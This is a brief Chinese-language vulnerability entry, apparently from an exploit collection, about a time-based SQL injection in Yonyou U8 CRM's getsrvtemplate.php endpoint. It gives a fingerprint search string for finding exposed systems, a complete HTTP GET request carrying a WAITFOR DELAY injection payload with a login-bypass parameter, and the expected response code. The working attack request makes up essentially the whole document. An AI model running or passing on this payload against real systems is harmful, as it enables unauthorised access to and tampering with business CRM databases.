# 用友U8CRMgetsrvtemplate.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友U8CRM"`
- **请求**：`GET /ajax/getsrvtemplate.php/getproductdata?type=1&DontCheckLogin=1&Action=fromsrvtpl&ProductID=';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200